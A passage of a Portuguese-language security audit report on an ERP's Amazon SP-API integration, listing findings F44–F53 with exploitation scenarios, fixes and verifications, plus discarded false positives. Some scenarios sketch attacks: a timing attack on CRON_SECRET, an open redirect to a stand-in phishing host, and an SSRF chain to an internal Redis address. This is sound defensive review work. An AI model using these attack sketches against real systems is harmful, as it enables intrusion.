4. `orderDateParams` (amazon-sp-api.ts L1076-1097) currently does NOT include BuyerInfo or ShippingAddress parameters. The SPOrder interface (L54-70) does not declare PII fields. So the current …

---

### F44 · [LOW] AuditLog persiste email e IP de tentativas de login (inclusive falhas) sem política de retenção

- **Dimensão:** pii-logging-exposure · **Categoria:** Sensitive Data Exposure / Privacy Violation · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/audit.ts:18-44`

**Descrição.** auditLog grava usuarioEmail, ip e userAgent na tabela AuditLog. No login (src/app/api/auth/login/route.ts L79-85), o evento LOGIN_FALHA registra metadata { email, slug } — ou seja, o email digitado em tentativas falhas (que pode ser de terceiros/enumeração) é persistido indefinidamente junto com o IP. Não localizei política de retenção/expurgo para AuditLog. A redação por regex (SECRET_KEY_RE) cobre senha/token mas, por design, mantém email/ip (são o propósito da auditoria).

**Cenário de exploração.** Acúmulo indefinido de email + IP de usuários (e de tentativas de login de não-clientes) constitui base de PII sem prazo de expurgo. Um vazamento/dump do AuditLog exporia o histórico de quem acessou de onde. É aceitável como trilha de auditoria, mas sem retenção definida vira passivo de privacidade.

**Remediação.** Definir e implementar retenção do AuditLog (ex.: expurgo/anonimização após N dias, conforme política de privacidade) e considerar mascarar o email em eventos de FALHA de login (armazenar hash ou só domínio) para reduzir PII de terceiros. Documentar a base legal e o prazo de retenção.

**Relevância Amazon DPP.** BAIXA/MÉDIA. Não é PII de comprador, mas a DPP e o questionário avaliam o programa geral de privacidade: logging de acesso é exigido, porém com retenção controlada e minimização. Ter trilha sem prazo de expurgo é um ponto a ajustar.

**Verificação adversarial.** Leitura direta dos arquivos confirma o achado sem mitigação ignorada:

1. `src/lib/audit.ts` L18-44: `auditLog()` persiste `usuarioEmail`, `ip` e `userAgent` em toda chamada. O campo `metadataJson` recebe o valor bruto passado pelo caller após apenas a redação por `SECRET_KEY_RE` (que cobre `secret|token|senha|password|authorization|key` — NÃO cobre `email` nem `ip`).

2. `src/app/api/auth/login/route.ts` L79-85: no branch de falha de autenticação, `metadata: { email, slug }` é passado diretamente para `auditLog()`. O `email` digitado pelo usuário (podendo ser de terceiros, erros de digitação, enumeração) é gravado em texto claro em `metadataJson`.

3. Schema Prisma (`prisma/schema.prisma` L1102-1124 e `schema.postgresql.prisma` L1083-1105): modelo `AuditLog` não tem campo `expiresAt`, TTL, soft-delete ou qualquer mecanismo de ciclo de vida. O índice `@@index([criadoEm])` existe mas nenhum código o usa para purge.

4. Busca exaustiva em `src/` por `AuditLog.*deleteMany`, `purge`, `expurgo`, `retention`: zero resultados. Nenhum job, script ou cron (`deploy/crontab.example`) toca em `A…

---

### F45 · [LOW] Comparacao nao constant-time do CRON_SECRET

- **Dimensão:** secrets-crypto · **Categoria:** Improper Verification / Timing Side-Channel · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/cron-auth.ts:13-14`

**Descrição.** verifyCronRequest compara o header Authorization com o segredo via igualdade de string nativa: `if (header === \`Bearer ${secret}\`) return { ok: true }`. Isso e uma comparacao curto-circuitada (nao constant-time), em contraste com a verificacao do INTERNAL_HEALTH_TOKEN (src/app/api/health/route.ts:20-26) e do OAuth state do Gmail (src/lib/gmail.ts:92-96), ambos usando timingSafeEqual. Em tese expoe um side-channel de timing por byte na validacao do CRON_SECRET, que protege os endpoints publicos /api/amazon/cron-* (proxy.ts:25-28). Na pratica e dificil de explorar remotamente (jitter de rede, JIT, comparacao de tamanho total dominante) e o segredo e de alta entropia, por isso a severidade e baixa.

**Cenário de exploração.** Atacante remoto sem o token envia repetidos POST a /api/amazon/cron-orders com Authorization: Bearer <palpite>, medindo diferencas de latencia para inferir prefixos corretos do CRON_SECRET byte a byte. Embora ruido de rede praticamente inviabilize o ataque em producao, e um desvio do padrao seguro ja adotado em outros pontos do codigo.

**Remediação.** Usar comparacao constant-time, igual ao isInternalTokenValid de health/route.ts: extrair o token do header, comparar comprimento e usar crypto.timingSafeEqual sobre Buffers. Reutilizar um helper compartilhado para todas as verificacoes de token de borda.

**Relevância Amazon DPP.** N/A. Endpoints de cron interno nao manuseiam diretamente PII do comprador nem credenciais OAuth do seller; e hardening geral, sem impacto direto na aprovacao DPP.

**Verificação adversarial.** The vulnerability is real and anchored in code exactly as described. In `src/lib/cron-auth.ts` line 14, `verifyCronRequest` uses the native string equality `header === \`Bearer ${secret}\`` — a short-circuit comparison, not constant-time. This is confirmed by reading the file directly. The contrast with `health/route.ts` lines 20-26 (which uses `timingSafeEqual` with a prior length check) and `gmail.ts` lines 91-96 (same pattern) is real and deliberate-looking in those files.

Additional detail the auditor missed: `src/app/api/amazon/reviews/cron-daily/route.ts` (lines 61-72) contains its own LOCAL copy of `verifyCronRequest` with the identical non-constant-time pattern. So the defect appears in two independent places, not one.

The four cron endpoints (`/api/amazon/cron-orders`, `/api/amazon/cron-inventory`, `/api/amazon/cron-finances`, `/api/amazon/reviews/cron-daily`) are listed in `PUBLIC_PATHS` in `proxy.ts` lines 25-29 — they bypass the session middleware entirely. The rate limiter applies (300 req per 15 min per IP per path, `proxy.ts` lines 6-8), which is not tight enough to …

---

### F46 · [LOW] Open redirect autenticado em GET de imagem de produto e avatar (302 para URL externa armazenada)

- **Dimensão:** ssrf-outbound · **Categoria:** Open Redirect / SSRF-adjacent · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/app/api/produtos/[id]/imagem/route.ts:104-106 (redirect 302 para produto.imagemUrl); analogo em src/app/api/perfil/avatar/route.ts:86-88`

**Descrição.** O GET de imagem de produto faz `if (/^https?:\/\//.test(url)) return NextResponse.redirect(url, { status: 302 })` onde url = produto.imagemUrl || produto.amazonImagemUrl. imagemUrl pode ser definido por OPERADOR/ADMIN (o campo manual de imagem). Nao ha allowlist de host no destino do redirect — diferente do next.config.mjs/CSP que restringem next/image a m.media-amazon.com. Assim, um usuario com permissao de editar produto pode fazer o endpoint emitir um redirect 302 para qualquer URL http(s). O mesmo padrao existe no avatar (avatarUrl). E open-redirect autenticado, nao SSRF (quem segue o redirect e o browser do cliente, nao o servidor), e o setter exige role privilegiada — por isso LOW.

**Cenário de exploração.** Um OPERADOR malicioso/comprometido seta Produto.imagemUrl='https://phishing.example/x' (via fluxo que aceite URL externa) e compartilha o link /api/produtos/<id>/imagem; vitimas autenticadas sao redirecionadas para o dominio externo. Impacto limitado: requer privilegio para gravar a URL e a vitima precisa abrir o link interno.

**Remediação.** Restringir o redirect a uma allowlist de hosts confiaveis (os mesmos do next.config remotePatterns: m.media-amazon.com, images-na.ssl-images-amazon.com). Se a URL nao casar com a allowlist, retornar 404/placeholder em vez de redirecionar. Aplicar identicamente ao avatar.

**Relevância Amazon DPP.** Baixo/N/A para PII de comprador, mas open-redirect e item de hardening comumente questionado em revisoes de seguranca. Corrigir reforca a postura geral exigida pela DPP.

**Verificação adversarial.** The vulnerability is real and code-anchored. Full evidence chain:

1. GET handler at src/app/api/produtos/[id]/imagem/route.ts lines 103-106 issues `NextResponse.redirect(url, { status: 302 })` unconditionally for any value in `produto.imagemUrl || produto.amazonImagemUrl` that matches `^https?:\/\/`. No allowlist of destination hosts is applied.

2. The `imagemUrl` write path is `POST /api/estoque/produtos` and `PATCH /api/estoque/produtos/[id]` (src/app/api/estoque/produtos/route.ts and [id]/route.ts), which call `estoqueService.criarProduto/atualizarProduto`. The Zod schema at src/modules/estoque/schemas.ts line 34 validates only `z.string().url()` — any syntactically valid URL is accepted, with no host/domain restriction. These endpoints require `requireRole(ADMIN, OPERADOR)`, which is the correct pre-condition the auditor identified.

3. `amazonImagemUrl` is populated by the catalog refresh job (jobs-handlers.ts:295) via Amazon SP-API — realistically Amazon CDN hostnames — but it is also used in the same unconditional redirect, meaning if Amazon's API ever returned a non-CDN URL…

---

### F47 · [LOW] Download de relatorio Amazon usa URL pre-assinada da resposta sem validacao de host (defesa em profundidade)

- **Dimensão:** ssrf-outbound · **Categoria:** Server-Side Request Forgery (SSRF) · **Confiança:** medium
- **Severidade (auditor → verificador):** INFO → LOW · **Veredito:** CONFIRMED
- **Local:** `src/modules/amazon/report-runner.ts:135-145 (downloadReportDocument: fetch(url) onde url = doc.url da resposta de getReportDocument)`

**Descrição.** downloadReportDocument faz fetch(url) onde url vem de doc.url (getReportDocument, report-runner.ts:94-104), que e a URL pre-assinada retornada pela SP-API. Em operacao normal a URL e confiavel (origina da Amazon). Porem, o host de origem dessa resposta e o proprio amazon_endpoint configuravel (ver finding ssrf-amazon-endpoint-token-leak): se um atacante apontar amazon_endpoint para um host controlado, esse host pode devolver um doc.url arbitrario, e o servidor fara fetch dele sem validacao. Isoladamente e INFO (depende do outro finding e nao envia token no download), mas mostra que a cadeia inteira confia em dados de uma origem que e configuravel.

**Cenário de exploração.** Encadeado com ssrf-amazon-endpoint-token-leak: atacante controla amazon_endpoint -> getReportDocument retorna doc.url=http://127.0.0.1:6379/ (ou metadata) -> downloadReportDocument faz fetch nesse alvo interno. Standalone nao e explotavel porque depende da resposta da Amazon real.

**Remediação.** Apos consertar amazon_endpoint (allowlist), validar tambem que doc.url aponta para hosts esperados (ex: *.amazonaws.com de relatorios) e bloquear hosts privados antes do fetch. Reusar o helper safe-fetch.

**Relevância Amazon DPP.** Indireto. Faz parte da mesma cadeia de protecao de credenciais/endpoint exigida pela DPP; corrigir o endpoint configuravel ja mitiga este vetor.

**Verificação adversarial.** The code evidence confirms all three legs of the chain the auditor describes:

1. `amazon_endpoint` is a free-text field stored in `ConfiguracaoSistema`, writable by any ADMIN user via `POST /api/amazon/config` with zero URL/host validation (`saveAmazonConfig` in `src/modules/amazon/service.ts:180-225` loops over `AMAZON_CONFIG_KEYS` and stores the value verbatim for non-secret keys; `amazon_endpoint` is not a secret key so it is never encrypted and has no format check).

2. `spApiRequest` in `src/lib/amazon-sp-api.ts:202` does `const endpoint = creds.endpoint || DEFAULT_ENDPOINT;` — an attacker who controls `amazon_endpoint` controls the base URL of all SP-API calls, including `getReportDocument` (`src/lib/amazon-sp-api.ts:453-466`). The response is deserialized as `SPReportDocument` (`url: string`), so the attacker-controlled server can return an arbitrary URL in `doc.url`.

3. `downloadReportDocument` in `src/modules/amazon/report-runner.ts:135-145` does a bare `fetch(url)` with no host validation, no private-CIDR check, and no allowlist. There is no `safe-fetch` helper in the cod…

---

### F48 · [INFO] CONTROLE OK: minimização forte — nenhuma PII de comprador é persistida nos modelos de pedido/venda

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Data Minimization (Amazon DPP) — controle existente · **Confiança:** high
- **Severidade (auditor → verificador):** INFO → INFO · **Veredito:** CONFIRMED
- **Local:** `src/lib/amazon-sp-api.ts / src/modules/amazon/parsers/all-orders-tsv.ts / prisma/schema.prisma:amazon-sp-api.ts:41-70 (SPOrder sem BuyerInfo/ShippingAddress); all-orders-tsv.ts:56-72; schema.prisma:507-549 (VendaAmazon)`

**Descrição.** Evidência positiva para a aprovação: o tipo SPOrder (amazon-sp-api.ts L54-70) só inclui orderId, datas, status, marketplace e itens — NÃO declara BuyerInfo, BuyerName, BuyerEmail, ShippingAddress nem Phone. getOrders/getOrder não invocam getOrderAddress nem getOrderBuyerInfo (grep confirmou zero ocorrências). O parser ALL_ORDERS (all-orders-tsv.ts L56-72) extrai SOMENTE colunas financeiras e de produto (sku, asin, item-price, taxes, promos) e ignora deliberadamente colunas de comprador/endereço mesmo quando presentes no TSV. Os modelos VendaAmazon, AmazonReembolso, AmazonReimbursement e AmazonReviewSolicitation não têm campos de nome/endereço/telefone/email/cpf de comprador (grep no schema confirmou).

**Cenário de exploração.** N/A — controle correto que reduz drasticamente a superfície de PII e favorece a aprovação DPP (princípio de minimização atendido para os dados modelados).

**Remediação.** Manter. Documentar explicitamente no questionário DPP que o sistema NÃO coleta/armazena PII de comprador (nome/endereço/telefone/email). Adicionar teste de regressão que falhe se um campo de PII de comprador for adicionado a VendaAmazon/AmazonOrderRaw. Resolver o gap de payloadJson cru (finding dpp-rawpayload) para que a minimização seja real e não acidental.

**Relevância Amazon DPP.** Forte ponto positivo no questionário (Data Minimization). É o argumento central a favor da aprovação — desde que reforçado pelo fechamento dos gaps de payload bruto e retenção.

**Verificação adversarial.** The auditor's core claims are all verified by direct code reading:

1. SPOrder interface (amazon-sp-api.ts L54-70): confirmed — only orderId, timestamps, status, salesChannel and orderItems. No BuyerInfo, ShippingAddress, BuyerName, BuyerEmail, Phone fields declared.

2. getOrders (L813-857) and getOrder (L881-909): confirmed — neither calls getOrderAddress nor getOrderBuyerInfo. These functions do not exist anywhere in the codebase (grep returned zero matches for those symbols).

3. VendaAmazon schema (schema.prisma L507-549 and schema.postgresql.prisma L550-570): confirmed — only financial/logistics fields, zero buyer PII columns.

4. AmazonReembolso, AmazonReviewSolicitation: confirmed via schema.prisma L613+, no buyer PII fields.

5. all-orders-tsv.ts (L56-72): confirmed — the AllOrdersTsvRow interface and the parser index map deliberately select only financial columns (item-price, item-tax, shipping-price, etc.) and ignore buyer/address columns even when present in the TSV.

One material nuance the auditor themselves flag but the finding correctly scopes out: `upsertAmazonOrderR…

---

### F49 · [INFO] CONTROLE OK: cifragem AES-256-GCM de segredos/OAuth em repouso com auth tag e redaction em auditoria

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Encryption at-rest / Secret handling (Amazon DPP) — controle existente · **Confiança:** high
- **Severidade (auditor → verificador):** INFO → INFO · **Veredito:** CONFIRMED
- **Local:** `src/lib/crypto.ts / src/modules/amazon/service.ts / src/lib/audit.ts:crypto.ts:50-93,99-109; service.ts:180-201 (saveAmazonConfig cifra); audit.ts:16,46-64 (redaction)`

**Descrição.** Controles presentes que ajudam na aprovação: (1) crypto.ts implementa AES-256-GCM com IV aleatório de 12 bytes e auth tag (cifragem autenticada), formato versionado enc:v1: — correto. (2) saveAmazonConfig (service.ts:188-194) cifra automaticamente campos sensíveis via isSecretConfigKey, que casa 'token'/'secret'/'password'/'_key' — portanto amazon_refresh_token e amazon_client_secret são cifrados at-rest. (3) audit.ts redige chaves sensíveis (SECRET_KEY_RE em L16: secret|token|senha|password|authorization|key) antes de serializar antes/depois/metadata, evitando segredos em texto puro na trilha. (4) Em produção, salvar segredo sem CONFIG_ENCRYPTION_KEY lança erro (crypto.ts:38-43).

**Cenário de exploração.** N/A — controles corretos. Ressalva: a proteção real depende de CONFIG_ENCRYPTION_KEY estar setada e de migrar segredos legados (ver finding dpp-encryption-key-empty).

**Remediação.** Manter. Garantir rotação de chave documentada e que a chave master seja gerida fora do banco (env/secret manager). Confirmar que TLS 1.2+ é forçado no Nginx (deploy/nginx-erp.conf tem HSTS) e que a conexão ao Postgres usa sslmode=require.

**Relevância Amazon DPP.** Atende diretamente os critérios de Encryption at-rest de credenciais OAuth e de não-logar segredos. Ponto positivo concreto para o questionário, condicionado à configuração correta da chave em produção.

**Verificação adversarial.** All four controls described in the finding were verified directly in the source code:

1. AES-256-GCM implementation (crypto.ts L50-93): `encryptConfigValue` uses `randomBytes(12)` for IV, `createCipheriv("aes-256-gcm", key, iv)`, retrieves the GCM auth tag via `cipher.getAuthTag()`, and stores the result as `enc:v1:<iv_b64>:<tag_b64>:<ct_b64>`. `decryptConfigValue` sets the auth tag before finalising the decipher, so tampering is detected. Implementation is correct.

2. saveAmazonConfig encryption gate (service.ts L183-194): `isSecretConfigKey(chave)` correctly matches `amazon_client_secret` (contains "secret") and `amazon_refresh_token` (contains "token") and passes them through `encryptConfigValue` before upsert. `amazon_client_id` is not encrypted — intentional and acceptable, as the LWA Client ID is semi-public (appears in OAuth redirect URLs). The same pattern is applied in `ads-service.ts`, `gmail.ts`, and `whatsapp-estoque/config.ts`, confirming consistent use of the pattern across all secret-saving sites. The masking skip at L188 (`valor.includes("*") && isSecretConfigKey(ch…

---

### F50 · [INFO] CONTROLE OK: isolamento multi-tenant fail-closed via extensão Prisma + ALS + cookie (quando enforce)

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Multi-tenant Isolation (Amazon DPP) — controle existente · **Confiança:** high
- **Severidade (auditor → verificador):** INFO → INFO · **Veredito:** CONFIRMED
- **Local:** `src/lib/db.ts / src/lib/tenant-context.ts:db.ts:303-406 (applyTenantIsolation); db.ts:47-110 (TENANT_MODELS inclui VendaAmazon/AmazonOrderRaw/AmazonReturn)`

**Descrição.** Quando TENANT_ISOLATION=enforce, a extensão do Prisma (db.ts:303-406) injeta where.empresaId em reads/updates/deletes e data.empresaId em creates para todos os TENANT_MODELS — que incluem corretamente os modelos de PII de pedido (VendaAmazon L59, AmazonOrderRaw L61, AmazonReembolso L63, AmazonReturn L90, AmazonReimbursement L89). Sem contexto e sem cookie de tenant resolvível, FAIL-CLOSED: lança erro em vez de vazar (L357-363). findUnique valida tenant pós-fetch e retorna null se a linha for de outra empresa (L372-388), inclusive abortando se o select omitir empresaId. Listas explícitas TENANT/GLOBAL com sanity-check.

**Cenário de exploração.** N/A — desenho correto e defensivo (fail-closed). Ressalva crítica: só vale com TENANT_ISOLATION=enforce; o default 'off' anula tudo (ver finding dpp-encryption-key-empty). Limitação documentada no próprio código (db.ts:255-261): uniques de negócio simples (ex: Produto.sku) precisam virar compostos com empresaId antes do onboard do 2º seller.

**Remediação.** Manter e exigir enforce em produção. Concluir a migração de uniques simples para compostos ([empresaId, ...]) antes de conectar o 2º seller. Manter/expandir os testes tenant-isolation.test.ts e o script test-isolamento-2-empresas.ts no CI.

**Relevância Amazon DPP.** Núcleo do requisito de segregação de dados entre sellers (bloqueador absoluto se vazar). O desenho fail-closed é forte argumento pró-aprovação, condicionado a estar ligado em prod e a uniques compostos.

**Verificação adversarial.** Leitura direta de src/lib/db.ts, src/lib/tenant-context.ts, src/lib/tenant-request.ts, src/lib/tenant-isolation.test.ts, src/lib/auth.ts, src/lib/session.ts, deploy/ecosystem.config.js e prisma/schema.postgresql.prisma confirma todos os pontos do achado.

MECANISMO CORRETO (enforce):
- applyTenantIsolation (db.ts L303-406) é o núcleo de isolamento. Quando TENANT_ISOLATION="enforce", injeta where.empresaId em FILTERED_OPERATIONS (findMany, findFirst, findFirstOrThrow, update, updateMany, delete, deleteMany, count, aggregate, groupBy) e data.empresaId em CREATE_OPERATIONS (create, createMany).
- FAIL-CLOSED confirmado em L357-363: sem contexto ALS, sem cookie válido e sem TENANT_FALLBACK_EMPRESA, lança erro explícito em vez de vazar.
- findUnique/findUniqueOrThrow faz validação pós-fetch (L372-388): retorna null se empresaId diferente; lança se o select omitir empresaId (impossibilidade de validar — fail-closed corretamente).
- TENANT_MODELS (L47-110) inclui corretamente VendaAmazon (L59), AmazonOrderRaw (L61), AmazonReembolso (L63), AmazonReturn (L90), AmazonReimbursement (L89) — todo…

---

### F51 · [INFO] Header X-Powered-By: Next.js nao desabilitado (fingerprinting de stack)

- **Dimensão:** config-deps · **Categoria:** Security Misconfiguration / Information Disclosure · **Confiança:** high
- **Severidade (auditor → verificador):** INFO → INFO · **Veredito:** CONFIRMED
- **Local:** `next.config.mjs:1-50`

**Descrição.** next.config.mjs nao define `poweredByHeader: false`. Por padrao o Next.js envia o header de resposta `X-Powered-By: Next.js` em todas as respostas, revelando o framework (e implicitamente versao aproximada) a qualquer cliente. O proxy.ts seta varios headers de seguranca via withSecurityHeaders mas nao remove este. Facilita reconhecimento/fingerprinting e correlacao com CVEs do framework.

**Cenário de exploração.** Scanner automatizado faz uma requisicao qualquer, le `X-Powered-By: Next.js`, classifica o alvo como app Next.js e direciona tentativas de exploracao especificas do framework (ex: vetores de imagem optimization, cache poisoning de rotas conhecidas).

**Remediação.** Adicionar `poweredByHeader: false` no objeto nextConfig em next.config.mjs.

**Relevância Amazon DPP.** BAIXA. Pura reducao de superficie de informacao; o questionario de seguranca valoriza minimizar disclosure de tecnologia. Nao bloqueia aprovacao, mas e item trivial de hardening.

**Verificação adversarial.** Verificacao direta em tres camadas da stack:

1. next.config.mjs (linhas 1-50): O objeto nextConfig nao contem `poweredByHeader: false`. O Next.js emite `X-Powered-By: Next.js` por padrao em todas as respostas HTTP quando essa opcao nao e desabilitada.

2. src/proxy.ts, funcao withSecurityHeaders() (linhas 130-151): Sete headers de seguranca sao adicionados (X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy, Cross-Origin-Opener-Policy, X-DNS-Prefetch-Control, CSP, HSTS). Nenhum deles remove ou sobrescreve o X-Powered-By. O middleware nao tem nenhuma instrucao como `headers.delete('X-Powered-By')`.

3. deploy/nginx-erp.conf (linhas 75-86): O bloco de proxy principal nao contem `proxy_hide_header X-Powered-By` nem `more_clear_headers X-Powered-By`. O Nginx repassa o header gerado pelo Next.js diretamente para o cliente sem filtro.

Nao ha nenhuma mitigacao presente em nenhuma camada (aplicacao, middleware, proxy reverso). O achado e real e exploravel exatamente como descrito: qualquer requisicao HTTP para o servico retornara o header `X-Powered-By: Next.js`, …

---

### F52 · [INFO] Build de producao ignora erros de TypeScript (typescript.ignoreBuildErrors)

- **Dimensão:** config-deps · **Categoria:** Security Misconfiguration / Code Quality · **Confiança:** medium
- **Severidade (auditor → verificador):** INFO → INFO · **Veredito:** CONFIRMED
- **Local:** `next.config.mjs:9-11`

**Descrição.** next.config.mjs define `typescript: { ignoreBuildErrors: true }`. O build de producao (next build) NAO falha mesmo com erros de tipo. A justificativa no comentario e evitar OOM do worker de TypeScript na VPS, com typecheck rodando manualmente antes do push. O risco e que regressao de tipo que afete invariantes de seguranca (ex: handler que deixou de receber/checar sessao, narrowing incorreto que ignora validacao Zod, campo PII tipado errado) chegue a producao sem ser barrada pelo pipeline de build. Depende de disciplina humana (npm run typecheck) que pode ser pulada.

**Cenário de exploração.** Um refactor introduz erro de tipo num route handler (ex: requireRole tipado mas chamado sem await, ou um where de Prisma sem empresaId) que o tsc local pegaria; o autor pula o typecheck manual; o build em prod passa assim mesmo e a regressao de seguranca vai ao ar.

**Remediação.** Rodar typecheck como gate obrigatorio no CI (separado do next build, para nao competir por RAM no worker), ou usar SWC/limitar memoria do checker em vez de desliga-lo. Manter ignoreBuildErrors:true apenas com um gate de CI equivalente que bloqueie merge em erro de tipo.

**Relevância Amazon DPP.** BAIXA. Indireto: a Amazon avalia maturidade do SDLC/controles de mudanca. Desligar o type-check no build de prod enfraquece um controle automatizado que poderia barrar regressoes de isolamento de tenant / checagem de auth, que sao centrais para multi-seller.

**Verificação adversarial.** O achado é factualmente correto: `next.config.mjs` linha 10 confirma `typescript: { ignoreBuildErrors: true }`, o que faz o `next build` de produção ignorar erros de tipo. Existe um job `typecheck` no CI (`.github/workflows/ci.yml`) que roda `tsc --noEmit` em push/PR para `main`, o que é uma mitigação parcial relevante — porém insuficiente para invalidar o achado pelos seguintes motivos:

1. **Branch protection não verificável via código**: Não há configuração de branch protection versionada (.github/). Se o job `typecheck` não estiver marcado como "required status check" no GitHub, um merge pode ocorrer mesmo com o job falhando ou sendo pulado. O histórico de commits mostra commits diretos em `feat/*` que vão a `main` via merge — sem evidência de PR gate obrigatório.

2. **Deploy manual bypassa CI completamente**: O processo de deploy descrito no CLAUDE.md é SSH direto (`git pull && npm run build`). O build de produção na VPS executa `next build` localmente, não passa pelo CI do GitHub. Um desenvolvedor pode fazer `git push origin main` + deploy SSH sem que o typecheck do CI seja ex…

---

### F53 · [INFO] Endpoints que servem arquivos usam findUnique sem empresaId no select (fail-closed em enforce, mas sem isolamento explicito)

- **Dimensão:** file-upload · **Categoria:** Multi-tenant Isolation (defense-in-depth) · **Confiança:** high
- **Severidade (auditor → verificador):** INFO → INFO · **Veredito:** CONFIRMED
- **Local:** `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:19-27 (select sem empresaId); padrao identico em src/app/api/produtos/[id]/imagem/route.ts L94-97 e src/app/api/perfil/avatar/route.ts L77-80`

**Descrição.** Os GETs que servem documento/imagem fazem db.<model>.findUnique({ where:{id}, select:{...} }) com select que NAO inclui empresaId. Pelo design do isolamento em src/lib/db.ts (L372-388), sob TENANT_ISOLATION=enforce o findUnique sem empresaId no resultado faz fail-closed (lanca erro), entao NAO ha vazamento cross-tenant — mas o endpoint quebra (500) salvo se o select for ajustado, e a autorizacao por tenant nao e expressa no codigo da rota (depende inteiramente da extensao Prisma). Em modo 'off' ou via TENANT_FALLBACK_EMPRESA (single-tenant interim) nao ha filtro algum: qualquer id e servido. Registro como INFO porque, com a config de producao declarada (enforce), o resultado e seguro-por-falha, nao vazamento; mas o acoplamento implicito e fragil para a meta multi-seller.

**Cenário de exploração.** Pre-condicao: rodar com TENANT_ISOLATION!=enforce (ex. 'off' ou fallback) com mais de uma empresa no banco. Nesse cenario, usuario de uma empresa baixa documento/imagem de outra empresa por id (CUID), pois nenhum filtro de empresaId e aplicado. Em enforce, o acesso falha-fecha (500) em vez de vazar.

**Remediação.** Incluir empresaId no select destes findUnique e validar explicitamente result.empresaId === sessao.empresaId na rota (defesa em profundidade independente da extensao). Garantir TENANT_ISOLATION=enforce em todos os ambientes com >1 tenant. Adicionar teste de isolamento cobrindo especificamente estes endpoints de serving de arquivo.

**Relevância Amazon DPP.** Relevante para a meta multi-seller: a DPP trata vazamento entre tenants como bloqueador absoluto. Hoje o fail-closed protege, mas a autorizacao deveria ser explicita e testada antes de onboard de sellers externos.

**Verificação adversarial.** The finding is real and the code evidence supports it. In `db.ts` lines 372-388, the `findUnique`/`findUniqueOrThrow` handler checks whether `empresaId` is present in the returned object. If the caller's `select` omits `empresaId`, the extension throws (`fail-closed`) under `TENANT_ISOLATION=enforce`. Under `off` or `TENANT_FALLBACK_EMPRESA`, no filtering occurs at all.

Confirmed per-endpoint:

1. `/api/documentos-financeiros/[id]/arquivo` (route.ts L19-27): `DocumentoFinanceiro` is in `TENANT_MODELS`. The `select` includes only `{id, nomeArquivo, caminhoArquivo, mimeType}` — no `empresaId`. Under `enforce`, every GET throws a 500. Under `off`/fallback, any authenticated user can fetch any document by CUID with no tenant check.

2. `/api/produtos/[id]/imagem` GET (route.ts L94-97): `Produto` is in `TENANT_MODELS`. The `select: { imagemUrl: true, amazonImagemUrl: true }` also omits `empresaId`. Identical behavior to case 1.

3. `/api/perfil/avatar` GET (route.ts L77-80): `Usuario` is in `GLOBAL_MODELS`, so the tenant extension does NOT apply. The query is `where: { id: session.uid }`…

---

## Falsos-positivos descartados na verificação (5)

| Dimensão | Achado | Por que foi descartado |
|---|---|---|
| authz-rbac-idor | PATCH /api/notificacoes/[id] marca qualquer notificacao como lida por id sem escopo | The auditor's finding ignores the Prisma extension layer in `src/lib/db.ts` that performs automatic tenant isolation.  Key facts from reading the actual code:  1. `Notificacao` is explicitly listed in `TENANT_MODELS` (db.ts line 81). This means the extension intercepts ALL Prisma… |
| authz-rbac-idor | isSameOriginMutation libera mutacoes quando o header Origin esta ausente | The auditor's finding is technically accurate in its description of code behavior (line 183 returns true when Origin is absent) but is a false positive because it ignores the primary CSRF defense that makes the Origin-absent path safe for browser-initiated requests.  PRIMARY DEFE… |
| multi-tenant | findUnique valida empresaId so apos buscar a linha; com select sem empresaId quebra/le cross-tenant em memoria | The auditor's primary claim - that cross-tenant row data reaches memory and risks leaking via logging or errors - is not supported by the code. The throw at db.ts L378-382 emits a static string containing only model name and operation name: "[tenant-isolation] Produto.findUnique:… |
| csrf-cors-headers | Strict-Transport-Security emitido apenas quando NODE_ENV=production (gap em staging TLS) | O achado esta tecnicamente correto quanto ao codigo do middleware Next.js (src/proxy.ts linha 143-148 confirma que HSTS so e emitido com NODE_ENV=production), e a assimetria com shouldCookieBeSecure() em session.ts (linha 108-113) e real. Porem o auditor ignorou uma mitigacao arq… |
| config-deps | Dependencias de parsing de arquivos nao confiaveis: exceljs 4.4.0 e @libpdf/core 0.3.4 | The auditor correctly acknowledged no CVE was confirmed for the specific parser behavior described (ReDoS/prototype pollution in exceljs or @libpdf/core causing DoS or RCE from a crafted XLSX/PDF). Investigation of the actual npm audit output reveals:  1. **exceljs 4.4.0**: The o… |

<!-- INDEX_END -->
